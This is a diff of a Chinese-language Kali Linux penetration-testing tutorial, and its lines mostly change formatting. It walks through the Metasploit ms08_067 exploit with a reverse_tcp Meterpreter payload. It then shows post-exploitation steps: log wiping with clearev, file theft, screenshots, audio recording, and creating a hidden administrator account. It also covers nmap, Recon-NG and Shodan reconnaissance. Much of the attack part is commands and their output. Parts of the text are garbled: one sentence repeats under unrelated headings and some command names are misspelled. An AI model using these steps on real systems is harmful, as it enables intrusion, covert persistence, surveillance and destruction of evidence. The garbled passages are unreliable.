+载荷有不同的方式向攻击系统返回通信。我通常更倾向于使用`reverse_tcp` shell，因为一旦它们在目标系统上执行，就会告诉攻击机器向外连接到我们的 Kali 系统。
 
 这样做的一个大优势是，由于受害者机器在技术上是“发起”向外的连接，它通常不会被防火墙拦截，而从外部尝试的连接极有可能会被拦截。
 
-一旦我们知道想要使用哪个载荷，就可以使用“set”命令进行设置。
+一旦我们知道想要使用哪个载荷，就可以使用`set`命令进行设置。
 
 - 6. 所以，对于我们的示例，让我们为 Windows 系统使用 Meterpreter shell 并让它通过 TCP 连接回我们：
 
@@ -906,17 +870,18 @@ payload => windows/meterpreter/reverse_tcp
 
 # 设置载荷选项
 
-载荷的选项设置方式与设置漏洞（exploit）完全相同。通常载荷设置包括漏洞向外连接的 IP 地址和端口。
+载荷的选项设置方式与设置漏洞（`exploit`）完全相同。通常载荷设置包括漏洞向外连接的 IP 地址和端口。
 
-这些选项也是通过“set”命令设置的。
+这些选项也是通过`set`命令设置的。
 
-- 7. 输入“show options”查看载荷需要什么：
+- 7. 输入`show options`查看载荷需要什么：
 
-如上面的图片所示，当我们运行该命令时，会出现一个标题为“Payload options”的新部分。我们还有三个可以设置的新选项：“EXITFUNC、LHOST 和 LPORT”。
+如上面的图片所示，当我们运行该命令时，会出现一个标题为“Payload options”的新部分。我们还有三个可以设置的新选项：“`EXITFUNC`、`LHOST`和`LPORT`”。
 
-我们将 EXITFUNC 和 LPORT 的设置保持为默认值。
+我们将`EXITFUNC`和`LPORT`的设置保持为默认值。
 
-- 8. 但我们需要在 LHOST 中填入本地主机地址。这是我们 Kali 系统的 IP：
+- 8. 但我们需要在`LHOST`中填入本地主机地址。这是我们 Kali 系统的 IP：
+
 ```
 msf exploit(ms08_067_netapi) > set LHOST 192.168.0.10
 LHOST => 192.168.0.10
@@ -926,7 +891,7 @@ LHOST => 192.168.0.10
 
 # 运行漏洞
 
-在开始时，最后运行一次“show options”命令并双重检查一切是否设置正确是一个好主意。
+在开始时，最后运行一次`show options`命令并双重检查一切是否设置正确是一个好主意。
 
 ```
 msf exploit(ms08_067_netapi) > show options
@@ -938,9 +903,10 @@ Module options (exploit/windows/smb/ms08_067_netapi):
 | SMBPIPE | BROWSER | yes | 使用的管道名称 (BROWSER, SRSVCS) |
 ```
 
-如果你注意上面，似乎我们忘记设置目标系统的（RHOST）IP 地址了！我们在上一个示例中设置了 RHOST，但当我们切换漏洞时，从未重新设置远程主机的 IP 地址。当你运行许多漏洞或攻击不同的系统时就会发生这种情况，所以双重检查你的设置是一个好主意。
+如果你注意上面，似乎我们忘记设置目标系统的（`RHOST`）IP 地址了！我们在上一个示例中设置了`RHOST`，但当我们切换漏洞时，从未重新设置远程主机的 IP 地址。当你运行许多漏洞或攻击不同的系统时就会发生这种情况，所以双重检查你的设置是一个好主意。
 
-- 9. 通过输入以下设置 RHOST 选项：
+- 9. 通过输入以下设置`RHOST`选项：
+
 ```set RHOST 192.168.0.20\```
 
 最后检查一次选项，一切看起来良好：
@@ -951,7 +917,7 @@ Module options (exploit/windows/smb/ms08_067_netapi):
 
 我们现在可以运行漏洞了。
 
-- 10. 要执行这一点，只需使用“exploit”命令。
+- 10. 要执行这一点，只需使用`exploit`命令。
 
 ```
 msf exploit(ms08_067_netapi) > exploit
@@ -961,13 +927,13 @@ msf exploit(ms08_067_netapi) > exploit
 
 # 连接到远程会话
 
-一旦漏洞成功，我们就可以查看创建的任何远程会话。要检查创建了哪些会话，输入“sessions ”命令。
+一旦漏洞成功，我们就可以查看创建的任何远程会话。要检查创建了哪些会话，输入`sessions`命令。
 
 任何创建的会话都会同目标系统的 IP 地址、计算机名和用户名一起显示。
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_42_1.png)
 
-我们现在可以像上面的示例会话一样，使用“sessions -i <ID#>”命令交互式连接到会话。
+我们现在可以像上面的示例会话一样，使用`sessions -i <ID#>`命令交互式连接到会话。
 
 当我们连接到会话时，提示符将变为 meterpreter 提示符：
 
@@ -975,16 +941,13 @@ msf exploit(ms08_067_netapi) > exploit
 meterpreter >
 ```
 
-我们将在下一章深入介绍 Meterpreter shell。但现在，如果我们输入“shell”命令，可以看到我们确实有一个 Windows 系统的远程 shell。
 
-# 
+
+我们将在下一章深入介绍 Meterpreter shell。但现在，如果我们输入“shell”命令，可以看到我们确实有一个 Windows 系统的远程 shell。
 
 在这一相当冗长的介绍中，我们学习了 Metasploit 的基础。在后续章节中，我们将深入探讨 Meterpreter shell。但现在，如果我们只是输入“shell”命令，我们可以看到我们确实有一个 Windows 系统的远程 shell。
 
-
-
-
-你只需使用“session -i <session #>”命令即可返回你的会话。
+你只需使用`session -i <session #>`命令即可返回你的会话。
 
 - Load and Run – 加并运行：这些命令允许你在 Meterpreter 内部使用额外的模块和命令。
 - Exit – 退出：退出 Meterpreter。
@@ -997,23 +960,32 @@ meterpreter >
 
 基本上，你可以使用标准的 Linux 命令进行移动和使用文件系统。你如何区分本地系统和你所连接的远程系统呢？
 
-所有命令均假设在**远程**系统上执行。例如，要列出远程系统的目录列表，只需使用“ls”命令：
+所有命令均假设在**远程**系统上执行。例如，要列出远程系统的目录列表，只需使用`ls`命令：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_46_1.png)
 
 如果在远程机器上创建一个名为“test”的目录，我们可以进入该目录，然后列出内容：
 
-```
+```text
 meterpreter > mkdir test
+
 Creating directory: cd test
+
 meterpreter > cd test
+
 meterpreter > ls
+
 Listing: C:\Users\Fred\Desktop\test
+
 =====================================
+
 Mode                Size Type        Last modified                 Name
+
 40777/rwxrxr-xr-x        0         dir             2013-10-20 20:34:39 -0400  
+
 40555/-r-xr-xr-x        0         dir             2013-10-20 20:34:39 -0400  
-meterpreter > 
+
+meterpreter >
 ```
 
 当你需要在本地（Kali）文件系统中移动时，可以使用几个命令。
@@ -1023,46 +995,69 @@ meterpreter >
 
 所以，如果我们需要检查本地工作目录，然后切换到 Kali 系统上的桌面目录，我们可以可以执行以下操作：
 
-```
+```text
 meterpreter > lpwd
+
 /root
+
 meterpreter > lcd Desktop
+
 meterpreter > getwnd
+
 /root/Desktop
-meterpreter > 
+
+meterpreter >
 ```
 
-Download 允许你从目标系统下载文件，反之，upload 允许你向远程系统发送文件。
+`Download`允许你从目标系统下载文件，反之，`upload`允许你向远程系统发送文件。
 
-所以，如果我们需要上传文件，只需连接到你所需的本地和远程目录，并带有要发送的文件名执行 upload 命令，如下：
+所以，如果我们需要上传文件，只需连接到你所需的本地和远程目录，并带有要发送的文件名执行`upload`命令，如下：
 
-```
+```text
 meterpreter > lcd Desktop
+
 meterpreter > lpwd
+
 /root/Desktop
+
 meterpreter > cd test
+
 meterpreter > pwd
+
 C:\Users\Fred\Desktop\test
+
 meterpreter > upload Tools : Tools -> Tools
+
 [*] uploading : Tools -> Tools
+
 [*] uploaded : Tools -> Tools
+
 meterpreter > ls
+
 Listing: C:\Users\Fred\Desktop\test
+
 =====================================
+
 Mode                Size Type        Last modified                 Name
+
 40777/rwxrxr-xr-x        0         dir             2013-10-22 08:15:25 -0400  
+
 40555/-r-xr-xr-x        0         dir             2013-10-22 08:12:36 -0400  
+
 100666/rwxr-xr-nw-        0         dir             2013-10-22 08:15:25 -0400 Tools
-meterpreter > 
+
+meterpreter >
 ```
 
-我们连接到了存放工具文件的 Kali 机器上的桌面。然后我们连接到目标上的“test”目录，简单地使用“upload”命令传输文件。
+我们连接到了存放工具文件的 Kali 机器上的桌面。然后我们连接到目标上的“test”目录，简单地使用`upload`命令传输文件。
 
-Download 的工作方式相同，只需使用 download 和文件名从远程系统拉取文件并存储在本地 Kali 机器上：
+`Download`的工作方式相同，只需使用`download`和文件名从远程系统拉取文件并存储在本地 Kali 机器上：
 
-```
+```text
 interpreter > download AccountInfo.txt
+
 [*] downloading: AccountInfo.txt -> AccountInfo.txt
+
 [*] downloaded : AccountInfo.txt -> AccountInfo.txt
 ```
 
@@ -1085,50 +1080,50 @@ interpreter > download AccountInfo.txt
 
 | Command | Description |
 | :--- | :--- |
-| clevars | 清除事件日志 |
-| drop_token | 放弃任何活跃的身份伪装令牌。 |
-| execute | 执行命令 |
-| getid | 获取当前进程标识符 |
-| getprivs | 尝试为当前进程启用所有权限 |
-| getuid | 获取运行服务器的用户 |
-| kill | 终止进程 |
-| ps | 列出运行中的进程 |
-| reboot | 重启远程计算机 |
-| reg | 修改并与注册表交互 |
-| rev2 | 在远程机器上调用 RevertToSIF() |
-| drop | 丢弃系统命令 |
-| shutdown | 关闭远程计算机 |
-| steal_token | 尝试从目标进程窃取身份伪装令牌 |
-| suspend | 暂停或恢复进程列表 |
-| sysinfo | 获取远程系统（操作系统）信息 |
+| `clevars` | 清除事件日志 |
+| `drop_token` | 放弃任何活跃的身份伪装令牌。 |
+| `execute` | 执行命令 |
+| `getid` | 获取当前进程标识符 |
+| `getprivs` | 尝试为当前进程启用所有权限 |
+| `getuid` | 获取运行服务器的用户 |
+| `kill` | 终止进程 |
+| `ps` | 列出运行中的进程 |
+| `reboot` | 重启远程计算机 |
+| `reg` | 修改并与注册表交互 |
+| `rev2` | 在远程机器上调用`RevertToSIF()` |
+| `drop` | 丢弃系统命令 |
+| `shutdown` | 关闭远程计算机 |
+| `steal_token` | 尝试从目标进程窃取身份伪装令牌 |
+| `suspend` | 暂停或恢复进程列表 |
+| `sysinfo` | 获取远程系统（操作系统）信息 |
 
-**CLEAREV** 这个实用的小命令将尝试清除远程计算机上的日志。
+`CLEAREV`这个实用的小命令将尝试清除远程计算机上的日志。
 
 我们要擦痕迹并清除目标机器上的系统日志。如果我们查看 Windows 7 系统侧的日志，可以看到它充满了事件：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_49_0.png)
 
-其中一些事件可能包含了我们所做的。我们可以通过输入“clearev”从 Kali 系统远程清除日志：
+其中一些事件可能包含了我们所做的。我们可以通过输入`clearev`从 Kali 系统远程清除日志：
 
-```
+```text
 > clearev
+
 [!] Wiping 1587 records from Application...
+
 [!] Wiping 5148 records from System...
 ```
-
-
-
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_52_0.png)
 
 上面的摄像头截图是我某天拍我我的猫的真实照片。我不确定为什么猫非要睡在笔记本电脑键盘上，但我现在知道是谁在网上订购了所有的金枪枪鱼了……
 
-# 截图 (SCREENSHOTS)
+# 截图（SCREENSHOTS）
 
-你可以使用“screenshot”命令获取目标显示器上当前显示的任何内容的快照：
+你可以使用`screenshot`命令获取目标显示器上当前显示的任何内容的快照：
 
-```
+```text
 meterpreter > screenshot
+
 Screenshot saved to: /root/Desktop/S0nfwcN.jpeg
 ```
 
@@ -1136,98 +1131,125 @@ Screenshot saved to: /root/Desktop/S0nfwcN.jpeg
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_52_1.png)
 
-好吧，除了让他的系统感染了后门漏洞之外，看来我们的明星员工在工作时花费了宝贵的时间玩网游。
+好吧，除了让他的系统感染了后门漏洞之外，看来我们的明星员工在工作时花费了宝贵的时间玩网游。  
 真不错……
 
-# 音频录音 (SOUND RECORDING)
+# 音频录音（SOUND RECORDING）
 
-录音的操作非常相似，只需输入“run sound_recorder -h”查看选项，或者如果你想获取一段30秒的音频片段，在不带任何选项的情况下运行命令：
+录音的操作非常相似，只需输入`run sound_recorder -h`查看选项，或者如果你想获取一段30秒的音频片段，在不带任何选项的情况下运行命令：
 
-```
+```text
 $ meterpreter > run sound_recorder
+
 [+] Saving recorded audio to /root/.msf4/logs/scripts/sound_recorder/LAPTOP_2013_1022,2739
+
 [+] Recording a total of 00m
+
 [+] Audio saved to: LAPTOP1.wav
 ```
 
-然后你可以在Kali系统上打开保存的文件进行收听：
+然后你可以在 Kali 系统上打开保存的文件进行收听：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_53_0.png)
 
-# 运行脚本 (Running Scripts)
+# 运行脚本（Running Scripts）
 
 本节我们将涵盖的最后一个主题是运行脚本。Meterpreter 有超过200个脚本，你可以运行它们来进一步扩展你的利用工具包。
 
-我们实际上已经接触过这些了。我们使用了“run”命令来使用音频和摄像头脚本攻击。我们将花时间介绍其中几个。
+我们实际上已经接触过这些了。我们使用了`run`命令来使用音频和摄像头脚本攻击。我们将花时间介绍其中几个。
 
-要查看所有可用脚本的列表，只需“Run <tab><tag>”：
+要查看所有可用脚本的列表，只需`Run <tab><tag>`：
 
-```
+```text
 $ meterpreter > run
+
 Display all 213 possibilities?(y or n)
 ```
 
-然后只需输入你想尝试的脚本名称并“run”。
+然后只需输入你想尝试的脚本名称并`run`。  
 这里是几个比较有趣的脚本：
 
-## CHECKVM:
+## CHECKVM
 
 有时当你获得远程 shell 时，你不确定自己是在虚拟机中还是在一台独立电脑上。你可以用此命令进行检查。
 
-```
+```text
 $ meterpreter > run checkvm
+
 [+] Checking if target is a Virtual Machine ....
+
 [+] This is a VMware Virtual Machine
 ```
 
 如你所见，它正确地判断出目标是一个 VMware 虚拟机。
 
-## GETGUI:
+## GETGUI
 
 Getgui 是一个很巧的小脚本，它允许你在 Windows 机器上启用远程桌面（如果尚未启用）并创建一个远程桌面用户。
 
 该用户会被同时添加到远程桌面用户组和管理员组。如果你想在日后某天连接回这台机器，这非常方便。
 
-首先，运行“run getui-e”来启用桌面：
+首先，运行`run getui-e`来启用桌面：
 
-```
+```text
 meterpreter > run getui-e
+
 > Windows Remote Desktop Configuration Meterpreter by Darkpreter
+
 > Carlos Perez carlos_perez@darkpreter.com
+
 > Enable Remote Desktop, enabling it ...
+
 > RDP is disabled, starting service mode
+
 > Setting Terminal Services service startup mode
+
 > The Terminal Services is not set to auto, changing it to auto ...
+
 > Reboot if necessary
+
 > For cleanup command: run multi_console_command -rc /root/.msf4/logs/scripts/getui
+
 1/clean.up 20131102.5019.rc
 ```
 
 然后再次运行程序并给出一个要使用的用户名和密码：
 
-```
+```text
 meterpreter > run getui -u EvilUser -p P$$password
+
 > Windows Remote Desktop Configuration Meterpreter by Darkpreter
+
 > Carlos Perez carlos_perez@darkpreter.com
+
 > Setting user account for login
+
 > Adding User: EvilUser with Password: P$$password
+
 > Hiding user from login screen
+
 > Adding User: EvilUser to local group 'Remote Desktop Users'
+
 > Adding User: EvilUser to local group 'Administrators'
+
 > You can now login with the created user
+
 > For cleanup command: run multi_console_command -rc /root/.msf4/logs/scripts/getui
+
 1/clean.up 20131102.5019.rc
 ```
 
-现在我们只需要打开终端并运行 Kali 自带的“rdes”命令来连接到 Windows 远程桌面：
+现在我们只需要打开终端并运行 Kali 自带的`rdes`命令来连接到 Windows 远程桌面：
 
-```
+```text
 root@kali:~# rdesktop -u EvilUser -p - 192.168.198.132
+
 Autoselected keyboard map en-us
+
 Password:
 ```
 
-“-p -" 选项告诉 rdesktop 向你提示输入密码。这要安全一些，因为你没有通过网络发送明文密码。
+`-p -`选项告诉`rdesktop`向你提示输入密码。这要安全一些，因为你没有通过网络发送明文密码。
 
 一旦我们登录，我们将在 Kali 机器上获得一个图形化的 Windows 桌面：
 
@@ -1235,64 +1257,85 @@ Password:
 
 花点时间去研究它们。
 
-## 远程 Shell (Remote Shell)
+## 远程 Shell（Remote Shell）
 
-最后，让我们看看如何获取一个真实的 C:\ 提示符。一旦有了 Meterpreter，这极其简单。只需输入命令“shell”。
+最后，让我们看看如何获取一个真实的`C:\`提示符。一旦有了 Meterpreter，这极其简单。只需输入命令`shell`。
 
-```
+```text
 meterpreter > shell
+
 Process 3044
+
 Channel 1 created.
+
 Microsoft [Version] 10.0.19045.3208 (c) Microsoft Corp. All rights reserved.
+
 C:\Users\Administrator>
 ```
 
-一旦有了 Meterpreter，这就可以获取真实的 C:\ 提示符。这极其简单。只需输入命令“shell”。
+一旦有了 Meterpreter，这就可以获取真实的`C:\`提示符。这极其简单。只需输入命令`shell`。
 
-## 玩模块 (Playing with Modules)
+## 玩模块（Playing with Modules）
 
-一旦我们有了 Meterpreter，这就可以获取真实的 C:\ 提示符。这极其简单。只需输入命令“shell”。
+一旦我们有了 Meterpreter，这就可以获取真实的`C:\`提示符。这极其简单。只需输入命令`shell`。
 
-## 恢复删除的文件 (Recovering Deleted Files)
+## 恢复删除的文件（Recovering Deleted Files）
 
-一旦我们有了 Meterpreter，这就可以获取真实的 C:\ 提示符。这极其简单。只需输入命令“shell”。
-
-
-
+一旦我们有了 Meterpreter，这就可以获取真实的`C:\`提示符。这极其简单。只需输入命令`shell`。
 
 随着我们的进行，看起来有 3 个用户账户（包括密码），我们已经能够从远程机器上恢复了它们！
 
 但如果我们想恢复 pdf 文件呢？
 
-再次，简单地“set FILES pdf” 并运行利用程序：
+再次，简单地`set FILES pdf`并运行利用程序：
 
-```
+```text
 msf post(recovery_files) > set FILES pdf
+
 FILES set=pdf
+
 msf post(recovery_files) > run
+
 * System - OS: Windows 7 (Build 7601, Service Pack 1), Drive: E:
+
 * FILE is made up of 1 datas
+
 * Searching deleted files in data run 1...
+
 * Name: R06957.pdf ID: 103778868
+
 * Hidden file found
+
 * File to download: $R06957.pdf (12865 bytes)
+
 * File saved on /root/msf/loot/2013103015215_default_192.168.192.132_nonident.file_751604.pdf
+
 * Name: R06974.pdf ID: 103779712
+
 * $106957.pdf ID: 1037738808
+
 * Hidden file found!
+
 * File to download: $106957.pdf
+
 * The file is resident. Saving /root/msf/loot/20131030152280_default_192.168.192.132_resident.file_896603.pdf
+
 * Name: IG0CHY7.txt ID: 103784832
+
 * MRT entries finished
+
 * Mobile execution completed
+
 msf post(recovery_files) >
 ```
 
-和上次一样，恢复的文件存储在 loot 目录。我们可以打开 PDF 来验证它是否起作用：
+
+
+和上次一样，恢复的文件存储在`loot`目录。我们可以打开 PDF 来验证它是否起作用：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_58_0.png)
 
-你也可以通过简单在 FILES 变量中列出你想要的内容并用逗号分隔，来设置模块以同时恢复多种文件类型，
+你也可以通过简单在`FILES`变量中列出你想要的内容并用逗号分隔，来设置模块以同时恢复多种文件类型。
 
 最后，也可以通过 ID 恢复文件（未显示）。
 
@@ -1321,22 +1364,23 @@ msf post(recovery_files) >
 | 686 | 6453482000 | 192.168.198.132 | TCP | 1328 terabase > 49167 |
 | 687 | 6454960000 | 192.168.198.132 | TCP | 54 terabase > 49167 |
 
-
-
 如你从上面的截图所示，Recon-NG 正在为一个名为“DomainName”的虚构网站进行域名枚举。在几秒钟内，就列出了几个域名。
 
-Recon-NG 收集的所有数据都存储在数据库中。你可以创建一个报告来这些数据。
+Recon-NG 收集的所有数据都存储在数据库中。你可以创建一个报告来导出这些数据。
 
-只需输入“back”即可退出当前模块：
+只需输入`back`即可退出当前模块：
 
 ```
 [* 46 total hosts found.
+
 [*] 46 NEW hosts found!
+
 recon-ng [google_site] > back
+
 recon-ng > |
 ```
 
-再次输入“show modules”。
+再次输入`show modules`。
 
 注意“Reporting”（报告）部分：
 
@@ -1353,11 +1397,13 @@ reporting/pushpin
 
 ```
 recon-ng > use reporting/csv_file
+
 recon-ng [csv_file] > run
+
 46 records added to '/usr/share/recon-ng/workspaces/default/results.csv'
 ```
 
-所有文件将存储在“/usr/share/recon-ng/workspaces/default”目录下。
+所有文件将存储在`/usr/share/recon-ng/workspaces/default`目录下。
 
 ## Recon-NG 总结
 
@@ -1373,7 +1419,7 @@ Dmitry 是一个用于快速查找网站信息的简易工具。只需从菜单�
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_66_0.png)
 
-“dmitry -s SomeDomainName.com”将执行与 Recon-NG 部分演示的类似的扫描。
+`dmitry -s SomeDomainName.com`将执行与 Recon-NG 部分演示的类似的扫描。
 
 ## Netdiscover
 
@@ -1383,8 +1429,10 @@ Netdiscover 是 Kali 中包含的另一个实用的工具。它也可以从命�
 
 Netdiscover 扫描网络寻找设备并显示它们：
 
+```
 Currently scanning: 172.168.0.1/24 Screen View: Unique Hosts
 4 Captured ARP Request packets, from 3 hosts. Total size: 240
+```
 
 | IP | At Mac Address Count | Len | MAC Vendor |
 |---|---|---|---|---|
@@ -1396,7 +1444,7 @@ Currently scanning: 172.168.0.1/24 Screen View: Unique Hosts
 
 ## Zenmap
 
-Zenmap 基本上是广受欢迎的 nmap 命令的图形化版本。如果你熟悉 nmap，那么 Zenmap 是一个极好的起点。
+Zenmap 基本上是广受欢迎的`nmap`命令的图形化版本。如果你熟悉`nmap`，那么 Zenmap 是一个极好的起点。
 
 与之前的命令一样，Zenmap 可以从菜单或命令行启动。
 
@@ -1404,17 +1452,18 @@ Zenmap 基本上是广受欢迎的 nmap 命令的图形化版本。如果你熟�
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_67_0.png)
 
-只需填写目标 IP 地址，并在 Profile（配置）下拉框中选择你想要执行的扫描类型。Zenmap 将会在命令框中显示生成的 nmap 命令开关。然后点击“Scan”（扫描）按钮运行命令：
+只需填写目标 IP 地址，并在 Profile（配置）下拉框中选择你想要执行的扫描类型。Zenmap 将会在命令框中显示生成的`nmap`命令开关。然后点击“Scan”（扫描）按钮运行命令：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_67_1.png)
 
-如上所示，nmap 命令状态显示在 Nmap Output（Nmap 输出）窗口中。
+如上所示，`nmap`命令状态显示在 Nmap Output（Nmap 输出）窗口中。
+
 点击其他标签页查看其他信息，例如“Ports/ Hosts”（端口/主机）标签页：
 
 | Nmap Output | Ports / Hosts | Topology | Host Details | Scans |
 |---|---|---|---|---|
 | Port | Protocol | State | Service | Version |
-| 53 | tcp | open | tcpwrapped | | |
+| 53 | tcp | open | tcpwrapped | |
 
 或者“Host Details”（主机详情）窗口：
 
@@ -1431,13 +1480,13 @@ Zenmap 基本上是广受欢迎的 nmap 命令的图形化版本。如果你熟�
 ### 资源
 
 - Shodan 网站 - http://www.shodanhq.com/
--- Google Dorks 数据库 - http://www.exploit-db.com/google-dorks/
+- Google Dorks 数据库 - http://www.exploit-db.com/google-dorks/
 
 ### 简介
 
 Shodan 是网络上最酷的网站之一。被称为“黑客的 Google”、“黑暗 Google”且许多时候“令人恐惧”，它是一个针对计算机的搜索引擎。
 
-Shodan 允许你通过搜索关键词查找互联网上的计算机。例如，你可以搜索位于加拿 Microsoft IIS 7.0 服务器，以及位于非洲的所有 Linux 系统。
+Shodan 允许你通过搜索关键词查找互联网上的计算机。例如，你可以搜索位于加拿大的 Microsoft IIS 7.0 服务器，以及位于非洲的所有 Linux 系统。
 
 如果你熟悉“Google Dorks”，Shodan 是类似的，但是一种更简单的方法来搜索互联网范围。
 
@@ -1445,13 +1494,13 @@ Shodan 允许你通过搜索关键词查找互联网上的计算机。例如，�
 
 但一旦你知道了这些魔术密钥，几秒钟内就可以搜索这些设备。或者通过使用过滤命令，可以将搜索缩小到特定的设备和区域。
 
-安全测试人员可以使用 Shodan 快速评估他们的网络中有哪些系统被公开显示，也许它们本不应该是这样的。在本节中我们将简要讨论如何
+安全测试人员可以使用 Shodan 快速评估他们的网络中有哪些系统被公开显示，也许它们本不应该是这样的。在本节中我们将简要讨论如何。
 
 ## 为什么要用 Shodan 扫描？
 
 有很多系统不应该被公开访问。任何使用密码的情况下，往往会留出默认密码（容易找到）或简单密码（容易破解）。
 
-公司所有者可能甚至没有直接直接将这些设备之一放到网上。多年来已经出现了几次发现大型公司物联网控制系统的报告。建筑承包商显然不懂网络安全，将它们完全开放了。
+公司所有者可能甚至没有直接将这些设备之一放到网上。多年来已经出现了几次发现大型公司物联网控制系统的报告。建筑承包商显然不懂网络安全，将它们完全开放了。
 
 ## Shodan 网站
 
@@ -1462,9 +1511,6 @@ Shodan 允许你通过搜索关键词查找互联网上的计算机。例如，�
 然后你只需要输入你的关键词进行使用，并点击搜索，就像在搜索引擎上一样。
 
 所以，如果我们想搜索 Cisco 路由器，只需输入“Cisco”并点击“搜索”：
-
-
-
 
 ## Shodan
 
@@ -1516,6 +1562,7 @@ Microsoft Corp.
 
 www.cotest1.microsoft.com
 
+```
 HTTP/1.0 200 OK
 Cache-Control: no-cache
 Content-Type: text/html
@@ -1529,13 +1576,14 @@ DP: ALL DO COR AM CURSE CUS CU IV/DO PRAD TAI
 X-Forwarded-By: ASP.NET
 Date: Thu, 18 Mar 2013 22:43:58 GMT
 Content-Length: 1020
+```
 
 4. 正文区域。
 
-- 1. 服务器标题信息。你可以通过将信息放入 title 命令中，搜索其他包含相同标题文本的服务器。
-- 2. 指定服务器所在的国家位置，同样可以使用 country 命令进行搜索。
+- 1. 服务器标题信息。你可以通过将信息放入`title`命令中，搜索其他包含相同标题文本的服务器。
+- 2. 指定服务器所在的国家位置，同样可以使用`country`命令进行搜索。
 - 3. 主机名搜索命令可以根据域名搜索服务器。
-- 4. 正文区域。输入到 Shodan 中的任何未加过滤器的文本都将被视为正文内容搜索，并将查找在正文区域中请求过请求信息的服务器。
+- 4. 正文区域。输入到 Shodan 中的任何未加过滤器的文本都将被视为正文内容搜索，并将查找在正文区域中请求过信息的服务器。
 
 ## 过滤器命令
 
@@ -1547,37 +1595,47 @@ Content-Length: 1020
 
 城市和国家命令允许你缩小搜索的地理位置。
 
-country:(两位国家代码) 或 city:(城市名称)
+`country:(两位国家代码)` 或 `city:(城市名称)`
 
+```
 country:US
 city:Memphis
+```
 
 更好的办法，如果你要寻找的城市位于多个国家，请将两者结合。
 
+```
 country:US city:Memphis
+```
 
 > HOSTNAME 命令
 
-使用 hostname 命令扫描整个域名：
+使用`hostname`命令扫描整个域名：
 
+```
 hostname:google
+```
 
-你可以使用完全限定域名名（FQDN）的部分，例如 google，或者使用整个站点，如 www.microsoft.com 或 support.microsoft.com。
+你可以使用完全限定域名（FQDN）的部分，例如`google`，或者使用整个站点，如`www.microsoft.com`或`support.microsoft.com`。
 
 > NET 命令
 
-使用 net 命令扫描单个 IP 或整个网块范围：
+使用`net`命令扫描单个 IP 或整个网块范围：
 
+```
 net:192.168.1.10
 net:192.168.1.0/24
+```
 
 ## TITLE 命令
 
-你也可以使用 Title 命令搜索项目：
+你也可以使用`title`命令搜索项目：
 
-title:"Server Room”
+```
+title:"Server Room"
+```
 
-标题 可能是最容易被忽视的搜索参数之一。你可以扫描整个互联网或你的整个域名来寻找标题关键词。
+标题可能是最容易被忽视的搜索参数之一。你可以扫描整个互联网或你的整个域名来寻找标题关键词。
 
 ## 关键词（KEYWORD）搜索
 
@@ -1591,23 +1649,29 @@ apache/2.2.8 200 ok
 
 或者你可能想跳过任何 401 未授权页面或 302 重定向页面？只需使用减号和 HTML 错误代码即可：
 
+```
 apache/2.2.8-401-302
+```
 
 ## 组合搜索
 
 有效的 Shodan 搜索是通过组合搜索术语完成的。通过几个关键词，你可以搜索你波士顿地区的所有运行 IIS/7.0 的微软服务器。
 
+```
 IIS/7.0 hostname:YourCompany.com country:Boston
+```
 
 或者你可以对你的域名进行快速安全扫描，查找需要更新的旧系统。例如任何位于法国的 IIS/5.0 系统。
 
+```
 IIS/5.0 hostname:YourCompany.com country:FR
-
-
-
+```
 
 登录，输入菜单上显示的名称和密码：
+
+```
 msfadmin/ msfadmin
+```
 
 你可能不会相信有多少初级安全专业人员询问过 Metasploit 的默认登录凭据。而且它们就写在登录屏幕上！
 
@@ -1621,23 +1685,24 @@ msfadmin@metasploitable:~$ _
 
 # 扫描目标
 
-许多安全测试人员的第一步之一是进行“nmap”扫描，以尝试确定哪些端口是开放的，理想情况下甚至是确定这些端口上安装了哪些服务。如果我们能够确定开放的端口和服务的程序版本，我们就可以利用该服务中的漏洞并攻破机器。
+许多安全测试人员的第一步之一是进行`nmap`扫描，以尝试确定哪些端口是开放的，理想情况下甚至是确定这些端口上安装了哪些服务。如果我们能够确定开放的端口和服务的程序版本，我们就可以利用该服务中的漏洞并攻破机器。
 
 让我们从 Kali 机器来看一眼 Metasploitable。
 
-要做的第一件事是运行 nmap 扫描并查看安装了哪些服务。
+要做的第一件事是运行`nmap`扫描并查看安装了哪些服务。
 
--   在你的 Kali 系统上打开终端窗口并输入：
+- 在你的 Kali 系统上打开终端窗口并输入：
 `nmap -sS -Pn <metasploitable IP 地址>`
 
-输入你的 Metasploitable 机器的 IP 地址，在我们的案例中是 192.168.198.145。如果你不知道你的 Metasploitable 的 IP 地址，你可以随时通过输入类似“nmap -sS -Pn 192.168.198.1-150”的内容来扫描一个地址范围。
+输入你的 Metasploitable 机器的 IP 地址，在我们的案例中是`192.168.198.145`。如果你不知道你的 Metasploitable 的 IP 地址，你可以随时通过输入类似`nmap -sS -Pn 192.168.198.1-150`的内容来扫描一个地址范围。
 
-“-sS”开关告诉 nmap 执行隐身扫描。“-Pn”告诉 nmap 不要运行 ping 扫描来查看哪些服务处于开启状态。
+`-sS`开关告诉`nmap`执行隐身扫描。`-Pn`告诉`nmap`不要运行 ping 扫描来查看哪些服务处于开启状态。
 
 这将向我们显示开放的端口，并尝试列出正在运行的服务：
 
 ```
 root@kali:~# nmap -sS -Pn 192.168.198.145
+
 Starting Nmap 6.40 (http://nmap.org ) at 2013-10-23 15:02 EDT
 Scan report for 192.168.198.145
 Host is up (0.0030s latency).
@@ -1648,38 +1713,59 @@ PORT     STATE     SERVICE
 23/tcp   open telnet
 25/tcp   open smtp
 53/tcp   open domain
-80/tcp   open http
-111/tcp  open rpcbind
-139/tcp  open netbios-ssl
-445/tcp  open microsoft-ds
-512/tcp  open oc
-513/tcp  open login
-514/tcp  open shell
-1099/tcp open rmireistry
-1524/tcp open ingresslock
-2049/tcp open nfs
-2121/tcp open cpproxy-ftp
-3306/tcp open mysql
-5432/tcp open postgres
-5900/tcp open vnc
-6348/tcp open x11
-6667/tcp open irc
-8080/tcp open ajp13
-8180/tcp open unknown
-MAC Address: 00:0c:29:07:64:4E (VMware)
+```
+
+
+
+`80/tcp` open http
+
+`111/tcp` open rpcbind
+
+`139/tcp` open netbios-ssl
+
+`445/tcp` open microsoft-ds
+
